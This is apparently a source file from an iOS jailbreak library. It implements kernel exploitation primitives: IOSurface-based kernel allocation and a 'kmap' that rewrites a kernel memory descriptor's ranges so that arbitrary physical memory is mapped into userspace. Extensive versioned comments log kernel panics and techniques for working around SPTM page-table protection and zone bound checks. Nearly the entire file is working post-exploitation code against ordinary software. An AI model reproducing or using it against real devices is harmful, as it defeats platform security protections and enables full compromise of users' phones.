#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <errno.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	if (gPrimitives.krwMinSafeReadSize > 0x8) {
		uint32_t zoneSize = 0x30;
		uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

		uint8_t buf[gPrimitives.krwMinSafeReadSize];
		kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
		return UNSIGN_PTR(*(uint64_t *)(&buf[0x18 - readOffset]));
	} else {
		return kread_ptr(surfaceSendRight + 0x18);
	}
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, ranges));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + koffsetof(IOSurface, ranges), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, memoryDescriptor));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
	return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, rangeCount));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + koffsetof(IOSurface, rangeCount), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	if (koffsetof(IOMachPort, object)) {
		if (gPrimitives.krwMinSafeReadSize > 0x8) {
			uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8; // object is the last field in IOMachPort
			uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

			uint8_t buf[gPrimitives.krwMinSafeReadSize];
			kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
			surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
		} else {
			surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
		}
	}
	return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
	IOSurfaceRef surfaceRef = NULL;
	if (cacheMode != 0) {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
			(__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
		});
	} else {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
		});
	}

	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

struct IOSurface_toCleanup {
	uint64_t descriptor;
	uint64_t origRanges;
	uint64_t *fakeRangesUA;
};

// v84: single-active L2 redirect state (kmap PTE-retarget path)
static uint64_t g_l2_addr   = 0;
static uint64_t g_l2_orig   = 0;
static int      g_l2_active = 0;
extern void jb_tr_beacon(const char *fmt, ...);

// v87: census carve-out map (fed by a18_probe after census-done). The
// L2 table PA is checked against these BEFORE any primitive access —
// v86 panicked because the pool's L2 table page sat in a hole on that
// boot (kernel TTBR1 has no alias for hole pages).
static struct { uint64_t lo, hi; } g_holes[16];
static int g_hole_n = 0;
void IOSurface_set_hole_run(uint64_t basePA, uint64_t pages)
{
	if (g_hole_n < 16) {
		g_holes[g_hole_n].lo = basePA;
		g_holes[g_hole_n].hi = basePA + pages * 0x4000ULL;
		g_hole_n++;
	}
}
static int pa_in_hole(uint64_t pa)
{
	for (int i = 0; i < g_hole_n; i++)
		if (pa >= g_holes[i].lo && pa < g_holes[i].hi) return 1;
	return 0;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below

struct IOSurface_toCleanup *cleanups = NULL;
unsigned cleanupsCount = 0;

// v84: restore hook — runs at kmap() ENTRY (before any new redirect) and
// on kernel-panic path teardown (fwscan flush/reboot), making the redirect
// self-healing: the L2 entry survives only while the exploit wants it.
void IOSurface_l2_restore(void)
{
	if (g_l2_active) {
		kwrite64(g_l2_addr, g_l2_orig);
		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
		g_l2_active = 0;
	}
}

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
	// uniform across all 8 census windows; this names the failing step.
	// No control-flow changes: only observations (plus a NULL-port guard
	// that only matters in the already-failing case).
	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
	// v81: PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows). So: take
	// the surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. No descriptor/surface writes at all — teardown-safe.
	static unsigned g_kmap_seq = 0;
	unsigned seq = g_kmap_seq++;
	jb_tr_beacon("KMAP win=%u", seq);
	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
	if (!surfaceMachPort) {
		jb_tr_beacon("KMAP fail,noport");
		return -1;
	}
	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
	jb_tr_beacon("KMAP step1,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
	             (unsigned long long)surfaceSendRight,
	             (unsigned long long)surface,
	             (unsigned long long)desc, (unsigned long long)ranges);

	// v75: desc-side pre-state baseline. NOTE: v74's baseline read
	// kread64(ranges)/kread64(ranges+8) — the ranges ELEMENT is a 16-byte
	// kalloc.type6.16 object and ClearSword's fixed 32-byte RMW tripped
	// zone bound checks → kernel panic 2026-09-05 21:37:02. LAW: never aim
	// a ClearSword primitive at a sub-32-byte kernel object. All reads
	// below are INSIDE the (large) memory descriptor object.
	jb_tr_beacon("KMAP pre,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
	             (unsigned long long)kread64(desc + 0x60),
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned int)kread32(desc + 0x20),
	             (unsigned long long)kread64(desc + 0x28),
	             (unsigned int)kread8(desc + 0x88),
	             (unsigned long long)kread64(desc + 0x70),
	             (unsigned long long)kread64(desc + 0x18),
	             (unsigned long long)kread64(desc + 0x90));

	// v81 PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows, descriptor
	// AND surface.ranges retargeted and verified). New path: take the
	// surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. NO IOSurface writes at all — the exit-during-rewrite
	// panic class (00:07:39) dies here. PTE writes sit inside 4KB L3
	// table pages (RMW LAW v2 satisfied; window is 32B-aligned, 64KB-
	// aligned base0 ⇒ PTE index multiple of 4).
	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
	if (!refA) {
		jb_tr_beacon("KMAP fail,lookupA");
		*uaddr = NULL;
		return -1;
	}
	void *base0 = IOSurfaceGetBaseAddress(refA);
	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
	if (!base0) {
		jb_tr_beacon("KMAP fail,base0A");
		*uaddr = NULL;
		return -1;
	}

	// v84: L2 REDIRECT. v83 panic (esr 9600004f, far=l3+0x770) proved the
	// pool's L3 table page alias is UNMAPPED in kernel TTBR1 (carve-out
	// hole) — the walk can never reach the L3. But the L2 table IS mapped
	// and writable (l2e read ✓). So: build a fake L3 table in base0's own
	// backing page (userspace write through the mapping — free), get its
	// PA from the surface's ranges element read through its PAPT ALIAS
	// (aliases bypass zone bound checks — the 16B element is unreachable
	// only at its zone VA), and kwrite64 the L2 entry to point at it.
	// Restore discipline: original L2 entry saved; restored at next kmap
	// entry, at l2_restore(), and in cleanup.
	// v93 KERNEL-MAPPED RETARGET (v92 panic 16:23:16 = SPTM WRITE LAW 1
	// REFINED: stores into ANY page-table page are fatal — pool L2 (v89/
	// v90), kernel-static (v24/25), AND our own user pmap L2 (v92, x3=
	// donorPA|0x3 at +0x6334). Translation structures are SPTM-guarded,
	// period. The only SPTM-legal way to change a mapping is to make the
	// KERNEL do it. So: retarget the SURFACE's range list to the target PA
	// (all writes = regular kernel-heap via alias, each class proven on
	// device this campaign) and let IOSurfaceGetBaseAddress map it.
	// - desc+0x60 = donor array VA (v75-proven landing, same window class)
	// - desc+0x50 = 0x10000 (v75-proven: r50 10000→20000 landed)
	// - desc+0x28 = 0 memRef (v75-proven; drops the old phys backing ref
	//   chain so the re-map rebuilds from the new ranges — hypothesis under
	//   test, beaconed separately)
	// - donor array = 4 range entries covering pa..pa+0x10000, written via
	//   the array alias (v89/v90/v92-proven: fake3 writes landed ×3)
	// Decode: base1 != base0 & content varies → the getter re-maps → THIS
	// IS the probe window → CHAIN GATE. base1 == base0 → cache lives in the
	// IOSurfaceClient → v94 walks the send-right kobject (fields beaconed
	// below). base1 == 0 → re-map failed, sr fields + fail beacon name it.
	uint64_t arrVA = IOSurface_kalloc_16up(0x4000, true);
	if (!arrVA || arrVA == (uint64_t)-1) {
		jb_tr_beacon("KMAP fail,kalloc16up");
		*uaddr = NULL;
		return -1;
	}
	jb_tr_beacon("KMAP donor,arrva=%llx", (unsigned long long)arrVA);
	uint64_t arrAlias = phystokv(kvtophys(arrVA));
	if (!arrAlias) {
		jb_tr_beacon("KMAP fail,arralias");
		*uaddr = NULL;
		return -1;
	}
	uint64_t arrOff = arrVA & 0x3FFFULL;
	if (arrOff + 4 * 0x10 > 0x4000) {
		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
		*uaddr = NULL;
		return -1;
	}
	// 4 range entries: {addr=pa+n*0x4000, size=0x4000} — covers the whole
	// 0x10000 probe scan. Written through the donor ALIAS (data-page heap:
	// SPTM-legal, proven ×3).
	for (int ei = 0; ei < 4; ei++) {
		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
	}
	jb_tr_beacon("KMAP ranges4,pa=%llx,e0=%llx,%llx",
	             (unsigned long long)pa,
	             (unsigned long long)kread64(arrAlias + arrOff),
	             (unsigned long long)kread64(arrAlias + arrOff + 8));

	// Retarget the descriptor via its alias windows (all inside the large
	// desc object — RMW-law compliant, v75-verified landing on 18.2).
	// W [0x48,0x68): size@0x50 + ranges@0x60 in ONE window.
	uint8_t winA[0x20];
	if (kreadbuf(desc + 0x48, winA, sizeof(winA)) != 0) {
		jb_tr_beacon("KMAP fail,readA,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	*(uint64_t *)(winA + (0x50 - 0x48)) = 0x10000ULL;      // size
	*(uint64_t *)(winA + (0x60 - 0x48)) = arrVA;          // ranges → donor
	if (kwritebuf(desc + 0x48, winA, sizeof(winA)) != 0) {
		jb_tr_beacon("KMAP fail,writeA,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	// W [0x18,0x38): memRef@0x28 → 0 (cache-buster, hypothesis beaconed).
	uint8_t winB[0x20];
	if (kreadbuf(desc + 0x18, winB, sizeof(winB)) != 0) {
		jb_tr_beacon("KMAP fail,readB,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	*(uint64_t *)(winB + (0x28 - 0x18)) = 0;
	if (kwritebuf(desc + 0x18, winB, sizeof(winB)) != 0) {
		jb_tr_beacon("KMAP fail,writeB,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	jb_tr_beacon("KMAP desc,rb,r50=%llx,r60=%llx,m28=%llx",
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned long long)kread64(desc + 0x60),
	             (unsigned long long)kread64(desc + 0x28));

	// Send-right kobject field dump (v94 feed: is the kobject the CLIENT?
	// object@0x30 resolved to `surface` — but +0/+8 may be client fields).
	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
	             (unsigned long long)kread64(surfaceSendRight + 0x0),
	             (unsigned long long)kread64(surfaceSendRight + 0x8),
	             (unsigned long long)kread64(surfaceSendRight + 0x30));

	// THE KERNEL DOES THE MAPPING: fresh lookup + GetBaseAddress.
	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
	int lookupB = (refB != NULL);
	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
	jb_tr_beacon("KMAP B,lookup=%d,base0=%llx,base1=%llx",
	             lookupB,
	             (unsigned long long)(uintptr_t)base0,
	             (unsigned long long)(uintptr_t)base1);
	if (!lookupB || !base1) {
		jb_tr_beacon("KMAP fail,base1");
		*uaddr = NULL;
		return -1;
	}
	// Content discriminator through the NEW mapping (kernel-driven).
	jb_tr_beacon("KMAP C,first=%llx,%llx",
	             (unsigned long long)*(volatile uint64_t *)base1,
	             (unsigned long long)((volatile uint64_t *)base1)[1]);
	*uaddr = base1;
	return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
	return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
	IOSurface_l2_restore(); // v84: never leave the L2 redirect dangling

	if (cleanupsCount == 0) return;

	for (unsigned i = 0; i < cleanupsCount; i++) {
		uint64_t desc = cleanups[i].descriptor;
		uint64_t origRanges = cleanups[i].origRanges;
		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;

		IOMemoryDescriptor_set_ranges(desc, origRanges);
		free(fakeRangesUA);
	}

	free(cleanups);
	cleanups = NULL;
	cleanupsCount = 0;
}

static CFNumberRef CFNUM64(uint64_t value) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);

	static vm_size_t dummyPageSize = 0x4000;
	static vm_address_t dummyPage = 0;
	if (dummyPage == 0) {
		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
	}

	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
		userspaceRanges[i] = dummyPage;
		userspaceRanges[i+1] = dummyPageSize;
	}

    CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
	CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     (const void *)dummyPageSizeNum);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);

	CFRelease(userspaceRangesData);
	CFRelease(dummyPageSizeNum);
	CFRelease(dict);

    return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
	if (size > 0x10000) return -1; // 0x10000 is max

	// v89 RMW-law fix, second pass (v88 run 13:32:35): runtime offsets are
	// ranges=0x360, rangeCount=0x3a4 (§49/§50 ground truth) — 0x44 apart, so
	// ONE 32B window can never cover both (v88's fail,offsets guard proved
	// it live, 32 beacons, no panic). Two windows, each fully inside the
	// 960B object (end 0x3c0):
	//   W_R [0x360,0x380)  ranges @ win+0
	//   W_C [0x388,0x3a8)  rangeCount @ win+0x1c (field end == window end)
	// Field reads extract from the window buffer; leak=true detaches the
	// array (original Dopamine semantics: kernel forgets it without freeing
	// → nothing can ever rewrite our fake L3) via RMW-style window writes
	// that preserve neighbors BY CONTENT.
	uint32_t offRanges   = koffsetof(IOSurface, ranges);
	uint32_t offRangeCnt = koffsetof(IOSurface, rangeCount);
	if (offRanges > 960 - 0x20 || (offRanges % 8) != 0) {
		jb_tr_beacon("KALLOC16UP fail,winR,ranges=%x", offRanges);
		return 0;
	}
	if (offRangeCnt < offRanges + 0x20 || offRangeCnt > 960 - 0x4) {
		jb_tr_beacon("KALLOC16UP fail,winC,cnt=%x", offRangeCnt);
		return 0;
	}
	uint32_t offWinC     = offRangeCnt - 0x1c;           // 0x3a4-0x1c = 0x388
	uint32_t cntOffInWin = offRangeCnt - offWinC;        // 0x1c
	if ((offRangeCnt + 0x4) > (offWinC + 0x20)) {        // field inside W_C
		jb_tr_beacon("KALLOC16UP fail,winCspan,cnt=%x", offRangeCnt);
		return 0;
	}

	while (true) {
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);

		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);

		// W_R: ranges qword (window [0x360,0x380) — v80-proven safe).
		uint8_t winR[0x20];
		if (kreadbuf(surface + offRanges, winR, sizeof(winR)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readR,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t va = UNSIGN_PTR(*(uint64_t *)(winR + 0));

		// W_C: rangeCount dword (window [0x388,0x3a8) ⊆ object).
		uint8_t winC[0x20];
		if (kreadbuf(surface + offWinC, winC, sizeof(winC)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readC,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t vaSize = (uint64_t)(*(uint32_t *)(winC + cntOffInWin)) * 0x10;

		if (vaSize < size) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (leak) {
			// Detach: ranges=0 via W_R RMW (preserve 0x368..0x380),
			// rangeCount=0 via W_C RMW (preserve 0x388..0x3a4).
			*(uint64_t *)(winR + 0) = 0;
			if (kwritebuf(surface + offRanges, winR, sizeof(winR)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeR,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
			*(uint32_t *)(winC + cntOffInWin) = 0;
			if (kwritebuf(surface + offWinC, winC, sizeof(winC)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeC,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
		}
		// leak=false: array stays attached — freed with the surface; caller
		// must finish before teardown (original semantics, unchanged).
		// Success path intentionally never deallocates the port send right
		// (original Dopamine behavior — the surface outlives the call).

		jb_tr_beacon("KALLOC16UP ok,va=%llx,size=%llx,leak=%d",
		             (unsigned long long)va, (unsigned long long)vaSize, leak ? 1 : 0);
		return va;
	}

	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, true);
	}
	else {
		alloc = IOSurface_kalloc_15(size, true);
	}

	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, false);
	}
	else {
		alloc = IOSurface_kalloc_15(size, false);
	}
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	gPrimitives.kalloc_global = IOSurface_kalloc_global;
	gPrimitives.kalloc_local  = IOSurface_kalloc_local;
}